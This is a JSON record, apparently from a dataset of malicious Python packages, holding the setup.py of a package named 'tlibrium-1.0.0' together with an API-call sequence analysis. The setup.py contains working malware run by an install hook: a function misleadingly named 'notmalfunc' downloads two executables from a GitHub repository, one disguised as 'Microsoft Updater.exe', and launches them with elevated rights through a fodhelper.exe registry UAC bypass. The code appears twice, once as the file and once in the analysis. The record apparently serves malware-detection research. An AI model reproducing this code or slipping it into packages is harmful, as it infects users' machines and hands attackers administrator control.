[
  {
    "pyfile": "setup.py",
    "code_snippet": "import os\nimport base64\nfrom time import sleep\nimport hashlib\n\ndef notmalfunc():\n    os.system('''pip install requests''')\n    from requests import get\n    from subprocess import call\n    from os import environ\n    import sys\n    import ctypes\n    import winreg\n    import subprocess\n    f=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/lib.exe')\n    open(f\"{environ['USERPROFILE']}lib.exe\", \"wb\").write(f.content)\n    f2=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/Microsoft%20Updater.exe')\n    open(f\"{environ['USERPROFILE']}Microsoft Updater.exe\", \"wb\").write(f2.content)\n    ELEVATE               = rf\"{environ['USERPROFILE']}Microsoft Updater.exe\"\n    FOD_HELPER            = r'C:\\Windows\\System32\\fodhelper.exe'\n    REG_PATH              = 'Software\\Classes\\ms-settings\\shell\\open\\command'\n    DELEGATE_EXEC_REG_KEY = 'DelegateExecute'\n    def is_running_as_admin():\n        try:\n            return ctypes.windll.shell32.IsUserAnAdmin()\n        except:\n            return False\n    def create_reg_key(key, value):\n        try:        \n            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)\n            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                \n            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        \n            winreg.CloseKey(registry_key)\n        except WindowsError:        \n            raise\n    def bypass_uac(cmd):\n        try:\n            create_reg_key(DELEGATE_EXEC_REG_KEY, '')\n            create_reg_key(None, cmd) \n        except WindowsError:\n            raise\n    def main():        \n        if not is_running_as_admin():\n                try:                \n                    cmd = '{} /k '.format(ELEVATE)\n                    bypass_uac(cmd)                 \n                    subprocess.check_output(FOD_HELPER, shell=True)       \n                    sys.exit(0)                \n                except WindowsError:\n                    sys.exit(1)\n    main()\n\n    ELEVATE2 = rf\"{environ['USERPROFILE']}lib.exe\"\n    \n    def main2():\n        if not is_running_as_admin():\n            try:                \n                cmd = '{} /k '.format(ELEVATE2)\n                bypass_uac(cmd)                 \n                subprocess.check_output(FOD_HELPER, shell=True)       \n                sys.exit(0)                \n            except WindowsError:\n                sys.exit(1)\n    main2()\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()",
    "pattern_analysis": {
      "api_sequence": [
        "os.system",
        "requests.get",
        "os.environ",
        "open",
        "requests.get",
        "os.environ",
        "open",
        "os.environ",
        "ctypes.windll.shell32.IsUserAnAdmin",
        "winreg.CreateKey",
        "winreg.OpenKey",
        "winreg.SetValueEx",
        "winreg.CloseKey",
        "winreg.CreateKey",
        "winreg.OpenKey",
        "winreg.SetValueEx",
        "winreg.CloseKey",
        "subprocess.check_output",
        "sys.exit",
        "subprocess.check_output",
        "sys.exit"
      ],
      "api_sequence_with_args": [
        "os.system('pip install requests')",
        "requests.get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/lib.exe')",
        "os.environ['USERPROFILE']",
        "open(f\"{environ['USERPROFILE']}lib.exe\", \"wb\").write(f.content)",
        "requests.get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/Microsoft%20Updater.exe')",
        "os.environ['USERPROFILE']",
        "open(f\"{environ['USERPROFILE']}Microsoft Updater.exe\", \"wb\").write(f2.content)",
        "os.environ['USERPROFILE']",
        "ctypes.windll.shell32.IsUserAnAdmin()",
        "winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)",
        "winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)",
        "winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)",
        "winreg.CloseKey(registry_key)",
        "winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)",
        "winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)",
        "winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)",
        "winreg.CloseKey(registry_key)",
        "subprocess.check_output(FOD_HELPER, shell=True)",
        "sys.exit(0)",
        "subprocess.check_output(FOD_HELPER, shell=True)",
        "sys.exit(0)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "ctypes.windll.shell32.IsUserAnAdmin",
          "id": "check_admin_privileges",
          "description": "Checks if process is running with administrator privileges",
          "first_id": "system_operations",
          "second_id": "system_privilege_operations",
          "third_id": "privilege_management"
        },
        {
          "api_name": "winreg.CreateKey",
          "id": "create_registry_key",
          "description": "Creates registry key at specified path",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "winreg.OpenKey",
          "id": "open_registry_key",
          "description": "Opens registry key with specified access",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "winreg.SetValueEx",
          "id": "set_registry_value",
          "description": "Sets value for specified registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_modification"
        },
        {
          "api_name": "winreg.CloseKey",
          "id": "close_registry_key",
          "description": "Closes the opened registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "winreg.CreateKey",
          "id": "create_registry_key",
          "description": "Creates registry key at specified path",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "winreg.OpenKey",
          "id": "open_registry_key",
          "description": "Opens registry key with specified access",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "winreg.SetValueEx",
          "id": "set_registry_value",
          "description": "Sets value for specified registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_modification"
        },
        {
          "api_name": "winreg.CloseKey",
          "id": "close_registry_key",
          "description": "Closes the opened registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "subprocess.check_output",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "sys.exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "subprocess.check_output",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "sys.exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        }
      ],
      "contextual_code": "def notmalfunc():\n    os.system('''pip install requests''')\n    from requests import get\n    from subprocess import call\n    from os import environ\n    import sys\n    import ctypes\n    import winreg\n    import subprocess\n    f=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/lib.exe')\n    open(f\"{environ['USERPROFILE']}lib.exe\", \"wb\").write(f.content)\n    f2=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/Microsoft%20Updater.exe')\n    open(f\"{environ['USERPROFILE']}Microsoft Updater.exe\", \"wb\").write(f2.content)\n    ELEVATE               = rf\"{environ['USERPROFILE']}Microsoft Updater.exe\"\n    FOD_HELPER            = r'C:\\Windows\\System32\\fodhelper.exe'\n    REG_PATH              = 'Software\\Classes\\ms-settings\\shell\\open\\command'\n    DELEGATE_EXEC_REG_KEY = 'DelegateExecute'\n    def is_running_as_admin():\n        try:\n            return ctypes.windll.shell32.IsUserAnAdmin()\n        except:\n            return False\n    def create_reg_key(key, value):\n        try:        \n            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)\n            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                \n            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        \n            winreg.CloseKey(registry_key)\n        except WindowsError:        \n            raise\n    def bypass_uac(cmd):\n        try:\n            create_reg_key(DELEGATE_EXEC_REG_KEY, '')\n            create_reg_key(None, cmd) \n        except WindowsError:\n            raise\n    def main():        \n        if not is_running_as_admin():\n                try:                \n                    cmd = '{} /k '.format(ELEVATE)\n                    bypass_uac(cmd)                 \n                    subprocess.check_output(FOD_HELPER, shell=True)       \n                    sys.exit(0)                \n                except WindowsError:\n                    sys.exit(1)\n    main()\n\n    ELEVATE2 = rf\"{environ['USERPROFILE']}lib.exe\"\n    \n    def main2():\n        if not is_running_as_admin():\n            try:                \n                cmd = '{} /k '.format(ELEVATE2)\n                bypass_uac(cmd)                 \n                subprocess.check_output(FOD_HELPER, shell=True)       \n                sys.exit(0)                \n            except WindowsError:\n                sys.exit(1)\n    main2()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()"
    }
  },
  {
    "metadata": {
      "package_name": "tlibrium-1.0.0"
    }
  }
]